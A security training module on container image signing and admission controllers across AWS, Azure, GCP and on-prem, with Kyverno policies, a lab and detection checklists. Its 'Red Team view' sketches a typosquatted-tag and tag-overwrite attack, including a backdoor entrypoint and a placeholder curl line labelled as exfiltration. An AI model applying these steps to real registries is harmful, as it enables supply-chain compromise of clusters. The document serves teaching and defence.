# 09 — Image Signing & Admission Controllers

> **Level:** Advanced
> **Prereqs:** [AMI Image Vuln & Supply Chain](ami-image-vuln-and-supply-chain.md) (AMI Image Vuln & Supply Chain), [Pod Security Admission & PSP Replacements](pod-security-admission-and-psp-replacements.md) (Pod Security Admission)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Execution, Persistence, Defense Evasion (see ATT&CK Containers matrix)
**Authorization scope:** Signing and verification examples use personal container images in sandbox registries. Cloud commands use placeholder account IDs. No supply chain attack against real registries.

## What & why

Container image signing cryptographically attests that an image came from a trusted build pipeline and has not been tampered with. Combined with admission controllers that *enforce* signature verification before a pod can run, this is the strongest defense against supply chain attacks. Sigstore/cosign is the de facto open standard with a public transparency log (Rekor). Without signing and admission enforcement, any image in the registry — including a malicious one pushed by a compromised CI pipeline or a typo-squatted tag — runs in your cluster.

## The OnPrem reality

On-prem image distribution relied on TLS-pulled container images from an internal registry (Harbor, Artifactory). Trust was network-based: if it came from the internal registry over HTTPS, it was trusted. This provides transport integrity but no provenance. An attacker who compromises the CI pipeline can push a malicious image to the internal registry, and all downstream consumers pull it without question. Signing closes this gap.

## Core concepts

| Concept | Description |
|---|---|
| **Sigstore / cosign** | OSS toolchain for signing OCI artifacts, storing signatures in the same registry as the image (or in a separate signature repo). Uses ephemeral keyless signing via OIDC. |
| **Rekor** | Immutable transparency log; records every signature issuance. Consumers verify a signature was logged in Rekor (prevents signing key compromise from retroactively signing old images). |
| **Fulcio** | Sigstore CA; issues short-lived code-signing certificates bound to an OIDC identity (e.g., GitHub Actions workflow). |
| **Admission controller** | Webhook that intercepts pod creation and verifies image signatures. Options: Cosign Validating Webhook, Ratify (Notary v2), Connaisseur, Kyverno verify-images rule. |
| **Notary v2 / Notation** | OCI 1.1 reference-types-based signing; supported natively by Azure Container Registry and AWS ECR (GCP Artifact Registry in preview). Uses ORAS for signature attachment. |
| **Digest pinning** | Referencing images by SHA256 digest (`image@sha256:...`) instead of mutable tags. Prevents tag mutation attacks but not malicious image injection at build time. |

### Signing flow

```
Developer pushes code → CI builds image → CI signs image with cosign
                                          ↓
                                    Signature pushed to registry
                                    Entry created in Rekor log
                                          ↓
K8s admission webhook → verifies signature against Rekor → allows/denies pod
```

## AWS

**ECR image signing options:**
- Notation (Notary v2) plugin for ECR — AWS-recommended path
- cosign with Sigstore — works with ECR
- AWS Signer — for managed signing (ECR + Lambda signing jobs)

**Sign an image with cosign and push to ECR:**

```bash
# AWS — authenticate and build
aws ecr get-login-password --region us-east-1 | \
  docker login --username AWS --password-stdin 111111111111.dkr.ecr.us-east-1.amazonaws.com
aws ecr create-repository --repository-name app-sec --region us-east-1
docker build -t 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1 .
docker push 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1

# AWS — sign with cosign (keyless via OIDC)
cosign sign 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1

# AWS — verify the signature
cosign verify 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1 \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --certificate-identity "https://github.com/example/sandbox-repo/.github/workflows/build.yml@refs/heads/main"
```

**Cosign verification admission webhook on EKS:**

```bash
# AWS — deploy cosign webhook on EKS
kubectl apply -f https://github.com/sigstore/cosign/releases/latest/download/cosigned-validating-webhook.yaml

# AWS — annotate namespace to enforce signature verification
kubectl label ns prod cosigned.sigstore.dev/inject=true
```

**Kyverno verify-images policy (EKS):**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  background: false
  rules:
    - name: check-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
      verifyImages:
        - imageReferences:
            - "111111111111.dkr.ecr.us-east-1.amazonaws.com/*"
            - "111111111111.dkr.ecr.us-east-1.amazonaws.com/*"
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/example/sandbox-repo/.github/workflows/build.yml@refs/heads/main"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor:
                      url: https://rekor.sigstore.dev
```

## Azure

**ACR signing — Notation (native Notary v2 support):**

```bash
# Azure — install notation and ACR plugin
az acr login --name acrsecexample
notation plugin install --url https://github.com/Azure/notation-azure-kv/releases/latest/download/notation-azure-kv.tar.gz

# Azure — sign an image with notation + AKV key
az acr build -t acrsecexample.azurecr.io/app-sec:v1 .
notation sign acrsecexample.azurecr.io/app-sec:v1@sha256:... \
  --plugin azure-kv \
  --id https://kv-example.vault.azure.net/keys/image-signing-key/00000000000000000000000000000000

# Azure — verify the signature
notation verify acrsecexample.azurecr.io/app-sec:v1@sha256:...
```

**ACR with cosign:**

```bash
# Azure
az acr login -n acrsecexample
docker push acrsecexample.azurecr.io/app-sec:v1
cosign sign acrsecexample.azurecr.io/app-sec:v1
```

**Ratify — admission controller for AKS (Notary v2 native):**

```bash
# Azure — install Ratify on AKS
helm repo add ratify https://ratify-project.github.io/ratify
helm install ratify ratify/ratify \
  --namespace gatekeeper-system --create-namespace \
  --set oras.authProviders.azureWorkloadIdentity.enabled=true

# Azure — Ratify verifies notation/cosign signatures at admission
kubectl apply -f - <<EOF
apiVersion: config.ratify.deislabs.io/v1beta1
kind: Store
metadata:
  name: store-akv
spec:
  name: store-akv
  address: kv-example.vault.azure.net
EOF
```

**Kyverno verify-images (AKS):**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-acr-image
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-acr-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences:
            - "acrsecexample.azurecr.io/*"
          attestors:
            - entries:
                - keyless:
                    issuer: "https://token.actions.githubusercontent.com"
                    subject: "https://github.com/example/sandbox-repo/.github/workflows/build.yml@refs/heads/main"
```

## GCP

**Artifact Registry — cosign keyless signing:**

```bash
# GCP — configure docker auth for Artifact Registry
gcloud auth configure-docker us-central1-docker.pkg.dev

# GCP — build and push
docker build -t us-central1-docker.pkg.dev/my-sandbox-project/app-repo/app-sec:v1 .
docker push us-central1-docker.pkg.dev/my-sandbox-project/app-repo/app-sec:v1

# GCP — sign with cosign (keyless)
cosign sign us-central1-docker.pkg.dev/my-sandbox-project/app-repo/app-sec:v1

# GCP — verify
cosign verify us-central1-docker.pkg.dev/my-sandbox-project/app-repo/app-sec:v1 \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --certificate-identity "https://github.com/example/sandbox-repo/.github/workflows/build.yml@refs/heads/main"
```

**Binary Authorization (GKE built-in image deployment control):**

```bash
# GCP — enable Binary Authorization on GKE
gcloud container clusters create cluster-sec \
  --zone=us-central1-a \
  --enable-binauthz

# GCP — create a Binary Authorization policy (only allow signed images)
gcloud container binauthz policy export > policy.yaml

# Edit policy.yaml to require attestation
# Then import:
gcloud container binauthz policy import policy.yaml
```

**Binary Authorization attestation (GKE-native):**

```bash
# GCP — create an attestor
gcloud container binauthz attestors create built-by-ci \
  --attestation-authority-note=projects/my-sandbox-project/notes/ci-attestor-note \
  --attestation-authority-note-project=my-sandbox-project

# GCP — create an attestation for a signed image
gcloud container binauthz attestations sign-and-create \
  --artifact-url="us-central1-docker.pkg.dev/my-sandbox-project/app-repo/app-sec@sha256:..." \
  --attestor=built-by-ci \
  --attestor-project=my-sandbox-project \
  --pgp-key-fingerprint=AAAA1111222233334444
```

## OnPrem (self-managed)

**Harbor registry with cosign:**

```bash
# OnPrem — push to Harbor
docker login harbor.internal.example.com
docker push harbor.internal.example.com/app-sec:v1

# OnPrem — sign with cosign (key-based or keyless)
cosign sign harbor.internal.example.com/app-sec:v1

# OnPrem — verify
cosign verify harbor.internal.example.com/app-sec:v1
```

**Kyverno + internal registry (works on any K8s):**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-internal-images
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-image-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences:
            - "harbor.internal.example.com/prod/*"
          attestors:
            - entries:
                - keyless:
                    issuer: "https://token.actions.githubusercontent.com"
                    subject: "https://github.com/example/sandbox-repo/.github/workflows/build.yml@refs/heads/main"
                    rekor:
                      url: https://rekor.sigstore.dev
          mutateDigest: true
```

**Connaisseur — admission controller for self-managed K8s:**

```bash
# OnPrem — deploy Connaisseur
helm repo add connaisseur https://sse-secure-systems.github.io/connaisseur/
helm install connaisseur connaisseur/connaisseur \
  --set policy.pattern="harbor.internal.example.com/*:*"
```

**Self-hosted Rekor instance (air-gapped):**

```bash
# OnPrem — deploy private Rekor transparency log
kubectl apply -f https://github.com/sigstore/rekor/releases/latest/download/rekor.yaml
# Configure cosign to use private Rekor:
export COSIGN_REKOR_URL=https://rekor.internal.example.com
```

## OnPrem mapping (recap table)

| Concern | OnPrem (self-managed) | AWS (EKS) | Azure (AKS) | GCP (GKE) |
|---|---|---|---|---|
| Image registry | Harbor / Artifactory / Docker Registry | ECR | ACR | Artifact Registry |
| Signing tool | cosign / Notation | Notation (native) / cosign | Notation (native, AKV) / cosign | cosign |
| Key management | Self-hosted KMS / PGP keys | AWS KMS / OIDC | Azure Key Vault / OIDC | Cloud KMS / OIDC |
| Transparency log | Private Rekor or public Rekor | Rekor (public) | Rekor (public) | Rekor (public) |
| Admission enforcement | Kyverno / Connaisseur / cosign webhook | Kyverno / Ratify / cosign webhook | Kyverno / Ratify / Azure Policy | Kyverno / Binary Authorization / cosign webhook |
| Managed enforcement | None | None (add-on) | Azure Policy (preview) / Ratify | Binary Authorization (built-in) |
| Digest mutation | Kyverno `mutateDigest: true` | Kyverno | Kyverno | Kyverno |

## 🔴 Red Team view

**Attack: Typosquat image tag → unsigned image deployed to cluster**

**Scenario:** An attacker with `image:push` permission to a registry creates a look-alike tag (`app:v1.0` vs `app:v1.O` with capital-O instead of zero) and a pod spec that references the attacker's image. Without signature enforcement, the admission controller allows it.

**Step 1 — Attacker pushes a backdoored image with a confusable tag:**

```bash
# Attacker has push access to their own repo in the same registry
docker build -t 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1.O -f- . <<EOF
FROM alpine
COPY backdoor.sh /tmp/backdoor.sh
ENTRYPOINT ["/tmp/backdoor.sh"]
EOF
docker push 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1.O
```

**Step 2 — Attacker creates a pod referencing the typosquatted image:**

```yaml
# The attacker hopes a developer or pipeline copy-pastes the wrong tag
apiVersion: v1
kind: Pod
metadata:
  name: not-the-real-app
  namespace: prod
spec:
  containers:
    - name: app
      image: 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1.O
```

**Step 3 — Without signature verification enforcement, the pod runs:**

```bash
kubectl apply -f malicious-pod.yaml
# Pod created — the attacker's backdoored image is now running
```

**Step 4 — Attacker with CI token compromise overwrites an existing tag:**

```bash
# Attacker compromised the CI service account (placeholder only)
docker build -t malicious-image -f- . <<EOF
FROM original-app:latest
RUN curl -o /tmp/exfil https://localhost:8080/collect
EOF
docker tag malicious-image 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1
docker push 111111111111.dkr.ecr.us-east-1.amazonaws.com/app-sec:v1
# Any rolling deployment now pulls the backdoored image
```

**Artifacts left:**
- Registry audit log (ECR CloudTrail / ACR Activity Log / Artifact Registry Audit Logs): `PutImage` event from unexpected actor or unexpected tag mutation
- Rekor: The attacker's image has *no* entry in the transparency log (detectable via `cosign verify`)
- K8s audit log: Pod creation referencing an unsigned or unfamiliar image tag
- K8s audit log: The pulled image digest is not in the registry's signature ledger

## 🔵 Blue Team view

**Detection signals:**

| Signal | Log Source | Query |
|---|---|---|
| Pod created with unsigned image | K8s audit + Rekor | `cosign verify <image>` returns `Error: no matching signatures` |
| Image push with no cosign entry in Rekor | Registry audit + Rekor API | Push event has no corresponding Rekor entry within 5 minutes |
| Tag overwrite / mutation | Registry audit | Multiple `PutImage` for the same `image:tag` digest from different CI identities |
| Pod referencing image from non-approved registry | K8s audit | `container.image` not matching `*.dkr.ecr.*.amazonaws.com/prod/*` pattern |
| CI identity used outside expected time window | OIDC token logs | `iss` claim time outside normal CI window |

**Kyverno policy — enforce image signature verification + block unapproved registries:**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: image-signing-and-source
spec:
  validationFailureAction: Enforce
  rules:
    - name: require-approved-registry
      match:
        any:
          - resources:
              kinds: [Pod]
      validate:
        message: "Images must come from approved registries"
        pattern:
          spec:
            containers:
              - image: "111111111111.dkr.ecr.us-east-1.amazonaws.com/* | acrsecexample.azurecr.io/* | us-central1-docker.pkg.dev/my-sandbox-project/*"

    - name: require-image-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences:
            - "111111111111.dkr.ecr.us-east-1.amazonaws.com/*"
            - "acrsecexample.azurecr.io/*"
            - "us-central1-docker.pkg.dev/my-sandbox-project/*"
          attestors:
            - entries:
                - keyless:
                    issuer: "https://token.actions.githubusercontent.com"
                    subject: "https://github.com/example/sandbox-repo/.github/workflows/build.yml@refs/heads/main"
          required: true
```

**Falco rule — unsigned image pull attempt (detected at runtime):**

```yaml
# This catches images that bypass admission (e.g., directly via CRI)
- rule: Unsigned Container Image Started
  desc: Container running with an image not present in allowed signature list
  condition: >
    container and
    container.image.repository not in (allowed_repo_list) and
    proc.name != "pause"
  output: "Potentially unsigned image running: %container.image.repository:%container.image.tag (container=%container.name)"
  priority: WARNING
```

**Preventive controls — cloud registry policy:**

```bash
# AWS: SCP denying push tag overwrite in production ECR repos
# (Applied at org level — placeholder account)
aws organizations create-policy \
  --content '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":["ecr:PutImage"],"Resource":["arn:aws:ecr:us-east-1:111111111111:repository/prod-*"],"Condition":{"Null":{"ecr:image-digest":"true"}}}]}' \
  --name DenyECRTagOverwrite \
  --type SERVICE_CONTROL_POLICY

# Azure: ACR content trust policy (lock image tags)
az acr config content-trust update \
  --registry acrsecexample \
  --status enabled

# GCP: Binary Authorization — enforce signed images
gcloud container binauthz policy import policy.yaml

# OnPrem: Harbor image immutability
# Harbor UI → Projects → Configuration → "Immutability" → enable
```

**Response steps — suspected unsigned image in cluster:**
1. Identify the pod: `kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].image | contains("v1.O"))'`
2. Freeze the pod for forensics: `kubectl exec <pod> -- tar czf /tmp/forensics.tgz /var/log /tmp`
3. Delete the pod and verify the deployment will not recreate it (check deployment/statefulset).
4. Verify all images in the namespace: `kubectl get pods -n <ns> -o json | jq -r '.items[].spec.containers[].image' | xargs -I{} cosign verify {}`
5. Audit registry for tag overwrites: check CloudTrail/Activity Log/Audit Log for `PutImage` events.
6. Revoke the CI identity that pushed the unsigned image.
7. Rotate all secrets accessible to the compromised pod.

## Hands-on lab

**Goal:** Sign an image with cosign, enforce verification via Kyverno, deploy signed and unsigned images, observe results.

**Prerequisites:** `kind`, `kubectl`, `cosign`, `helm`, `docker`, a GitHub repository (placeholder `github.com/example/sandbox-repo`).

**Steps:**
1. `kind create cluster --name sign-lab`
2. Build and push a test image to a public or local registry:
   `docker build -t your-registry/app-sec:v1 . && docker push your-registry/app-sec:v1`
3. Sign the image: `cosign sign your-registry/app-sec:v1`
4. Verify the signature: `cosign verify your-registry/app-sec:v1`
5. Install Kyverno: `helm install kyverno kyverno/kyverno -n kyverno --create-namespace`
6. Deploy a pod with the signed image (no policy yet) — succeeds.
7. Apply the `require-image-signature` Kyverno ClusterPolicy (adjust `imageReferences` to match your registry).
8. Deploy a pod with an unsigned image (e.g., `alpine:latest`) — rejected by Kyverno.
9. Deploy a pod with the signed image — succeeds.
10. Teardown: `kind delete cluster --name sign-lab`

**Expected output:** Unsigned image is rejected at admission. Signed image with a verifiable Rekor entry is allowed.

## Detection rules & checklists

**CLI audit one-liners:**

```bash
# All clouds: find pods using images by tag (mutable) not digest (immutable)
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.containers[].image | contains("@sha256:") | not) | "\(.metadata.namespace)/\(.metadata.name) image=\(.spec.containers[].image)"'

# All clouds: verify all running images have signatures
kubectl get pods -A -o json | jq -r '.items[].spec.containers[].image' | sort -u | while read img; do
  echo "Checking: $img"
  cosign verify "$img" 2>&1 || echo "  UNSIGNED: $img"
done

# All clouds: list images not from approved registries
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[].spec.containers[].image' | sort -u | \
  grep -v -E 'dkr.ecr|azurecr.io|pkg.dev|internal.example.com'

# ECR: audit image push events (via CloudTrail)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=PutImage \
  --query "Events[].{User:Username,Time:EventTime,Image:Resources[?ResourceType=='AWS::ECR::Repository']|[0].ResourceName}" \
  --region us-east-1

# GCP: list images without Binary Authorization attestation
gcloud container binauthz attestations list \
  --project=my-sandbox-project \
  --attestor=built-by-ci
```

**Supply chain integrity checklist:**

- [ ] All CI pipelines sign images with cosign/notation before push.
- [ ] Admission controller (Kyverno / Ratify / Binary Authorization) enforces signature verification in all namespaces.
- [ ] Image tags are pinned to SHA256 digests in all deployment specs (`image@sha256:`).
- [ ] Rekor transparency log is queried as part of signature verification.
- [ ] Private signing key (if not using keyless) is stored in cloud KMS, never in CI variables.
- [ ] Registry immutability is enabled (tags cannot be overwritten once pushed).
- [ ] Separate IAM roles for `image:push` (CI) and `image:pull` (K8s nodes). No overlapping credentials.

## References

- Sigstore/cosign: https://docs.sigstore.dev/
- Kyverno image verification: https://kyverno.io/docs/writing-policies/verify-images/
- Ratify (Notary v2 admission): https://ratify.dev/
- Connaisseur: https://sse-secure-systems.github.io/connaisseur/
- ECR Notation signing: https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-signing.html
- ACR content trust: https://learn.microsoft.com/en-us/azure/container-registry/container-registry-content-trust
- GKE Binary Authorization: https://cloud.google.com/binary-authorization/docs
- OCI image spec: https://github.com/opencontainers/image-spec
- Cross-links: [`03-02-ami-image-vuln-and-supply-chain.md`](ami-image-vuln-and-supply-chain.md), [`03-07-pod-security-admission-and-psp-replacements.md`](pod-security-admission-and-psp-replacements.md), [`03-08-container-escape-classes.md`](container-escape-classes.md)
